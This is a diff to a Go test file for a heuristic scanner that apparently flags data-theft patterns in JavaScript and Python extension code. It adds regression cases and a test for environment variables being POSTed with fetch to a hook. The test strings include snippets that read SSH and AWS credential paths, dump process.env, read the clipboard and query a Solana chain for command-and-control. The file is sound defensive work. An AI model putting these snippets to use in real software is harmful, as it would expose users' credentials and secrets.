@@ -1,6 +1,7 @@
 package heur
 
 import (
+	"strings"
 	"testing"
 
 	"github.com/shiva2021/purge/internal/ext"
@@ -48,9 +49,12 @@ func TestExfilRules(t *testing.T) {
 		{"credential_file_access", "a.js", `const k = path.join(home, ".ssh", "id_ed25519")`, 1, High},
 		{"credential_file_access", "a.js", `path.join(os.homedir(), '.vscode', 'settings.json')`, 0, 0},
 		{"credential_file_access", "test/a.js", `path.join(os.homedir(), '.aws', 'credentials')`, 0, 0},
+		// regression: file-name tables in Monaco / Python tooling
+		{"credential_file_access", "a.js", `filenames:["config",".gitattributes",".gitconfig",".editorconfig"]`, 0, 0},
+		{"credential_file_access", "a.js", `KNOWN_FILES=["pyproject.toml",".flake8",".pylintrc",".pypirc","Pipfile"]`, 0, 0},
 
 		// env_dump
-		{"env_dump", "a.js", `body: JSON.stringify(process.env)`, 1, Medium},
+		{"env_dump", "a.js", `const snapshot = JSON.stringify(process.env)`, 1, Medium},
 		{"env_dump", "a.py", `payload = json.dumps(dict(os.environ))`, 1, Medium},
 		{"env_dump", "a.js", `if (process.env.NODE_ENV === "production") {}`, 0, 0},
 
@@ -63,6 +67,8 @@ func TestExfilRules(t *testing.T) {
 		{"clipboard_or_screen_capture", "a.js", `exec("pbpaste")`, 1, Medium},
 		{"clipboard_or_screen_capture", "node_modules/clip/index.js", `exec("pbpaste")`, 0, 0},
 		{"clipboard_or_screen_capture", "a.js", `vscode.env.openExternal(uri)`, 0, 0},
+		{"clipboard_or_screen_capture", "a.js", `let s = await Pt.env.clipboard.readText()`, 0, 0}, // regression: Jupyter paste-URL prompt
+		{"clipboard_or_screen_capture", "a.js", `const s = await clipboard.readText()`, 1, Medium},
 
 		// c2_blockchain_or_dht
 		{"c2_blockchain_or_dht", "a.js", `import { Connection } from "@solana/web3.js"; c.getSignaturesForAddress(k)`, 1, High},
@@ -115,5 +121,23 @@ func TestExfilCapsAtFive(t *testing.T) {
 	}
 	if got := exfilRun(t, "suspicious_host", "a.js", src); len(got) != 5 {
 		t.Fatalf("got %d findings, want cap of 5", len(got))
+	}
+}
+
+func TestExfilEnvSentOverNetwork(t *testing.T) {
+	got := exfilRun(t, "env_dump", "a.js", "fetch(hook, {method:'POST', body: JSON.stringify(process.env)});")
+	if len(got) != 1 || got[0].Rule != "env_exfil" || got[0].Severity != High {
+		t.Fatalf("got %+v, want one High env_exfil", got)
+	}
+}
+
+// Regression: in a minified bundle one "line" is the whole file, so a data:
+// field and an unrelated process.env far away must not pair up.
+func TestExfilEnvDumpBoundedSpan(t *testing.T) {
+	src := "var A={data:t[ve],urlString:v.url};" + strings.Repeat("x", 2000) + "spawn(p,{env:process.env})"
+	for _, f := range exfilRun(t, "env_dump", "dist/extension.js", src) {
+		if f.Rule == "env_exfil" {
+			t.Fatalf("unexpected env_exfil: %+v", f)
+		}
 	}
 }
